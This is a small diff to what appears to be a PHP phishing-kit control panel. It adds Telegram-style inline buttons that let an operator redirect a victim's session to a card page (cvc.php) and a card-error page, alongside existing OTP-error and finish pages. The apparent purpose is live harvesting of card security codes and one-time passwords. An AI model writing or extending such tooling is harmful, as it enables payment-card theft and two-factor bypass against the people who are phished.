@@ -119,6 +119,10 @@ $keyboard = [
             ['text' => '【🛑】𝖮𝖳𝖯 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:otp-error.php"]
         ],
         [
+            ['text' => '【🍀】𝖢𝖺𝗋𝖽', 'callback_data' => "redir:$request_id:cvc.php"],
+            ['text' => '【🛑】𝖢𝖺𝗋𝖽 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:cvc-error.php"]
+        ],
+        [
             ['text' => '【🏁】𝖥𝗂𝗇𝖺𝗅𝗂𝗓𝖺𝗋', 'callback_data' => "redir:$request_id:finalizar.php"]
         ]
     ]
